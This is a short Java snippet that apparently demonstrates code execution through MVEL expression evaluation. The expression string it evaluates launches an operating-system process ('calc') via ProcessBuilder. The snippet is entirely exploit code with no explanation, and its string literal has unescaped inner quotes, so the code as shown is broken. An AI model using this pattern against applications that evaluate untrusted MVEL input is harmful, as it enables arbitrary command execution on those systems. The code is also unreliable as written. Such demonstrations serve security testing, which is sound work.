String exp = "a=123;new java.lang.ProcessBuilder("calc").start();";
Map vars = new HashMap();
vars.put("foobar", new Integer(100));
String result = MVEL.eval(exp, vars).toString();
